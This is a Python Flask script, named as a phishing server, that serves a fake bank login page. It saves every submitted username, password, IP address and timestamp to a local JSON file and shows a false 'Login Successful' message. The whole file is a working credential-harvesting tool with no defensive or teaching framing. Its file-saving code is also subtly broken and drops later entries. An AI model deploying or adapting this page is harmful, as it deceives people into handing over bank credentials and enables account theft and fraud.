filename="phishing_server.py"
```python
import os
import json
import time
import threading
from flask import Flask, render_template_string, request, jsonify


app = Flask(__name__)

# HTML Template for the Fake Login Page
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Secure Login</title>
 <style>
 body { font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background-color: #f0f2f5; }
.login-box { background: white; padding: 40px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); width: 350px; }
 input[type="text"], input[type="password"] { width: 100%; padding: 12px; margin: 10px 0; box-sizing: border-box; border: 1px solid #ddd; border-radius: 4px; }
 button { width: 100%; padding: 12px; background-color: #007bff; color: white; border: none; border-radius: 4px; cursor: pointer; }
 button:hover { background-color: #0056b3; }
 </style>
</head>
<body>
 <div class="login-box">
 <h2 style="text-align: center;">Bank Login</h2>
 <form action="/" method="POST">
 <input type="text" name="username" placeholder="Account Number / Username" required>
 <input type="password" name="password" placeholder="Password" required>
 <button type="submit">Login Securely</button>
 </form>
 </div>
</body>
</html>
"""

# Data storage file
DATA_FILE = "captured_data.json"

@app.route('/')
def home():
 return render_template_string(HTML_TEMPLATE)

@app.route('/', methods=['POST'])
def login():
 username = request.form.get('username')
 password = request.form.get('password')
 ip_address = request.remote_addr
 timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
 
 data = {
 "username": username,
 "password": password,
 "ip": ip_address,
 "time": timestamp
 }
 
 # Save to file
 file_exists = os.path.exists(DATA_FILE)
 with open(DATA_FILE, "a") as f:
     if not file_exists:
         f.write("[\n")
         f.write(f' {json.dumps(data)},\n')
 
 # If it's the last entry, remove the trailing comma for clean JSON
 with open(DATA_FILE, "r") as f:
     content = f.read()
     if content.endswith(',\n'):
         with open(DATA_FILE, "w") as f:
             f.write(content[:-2] + "\n]")
 
 return "Login Successful! Redirecting..."

if __name__ == '__main__':
 print("[+] Phishing Server running on http://0.0.0.0:5000")
 print("[+] Data is being saved to captured_data.json")
 app.run(host='0.0.0.0', port=5000)
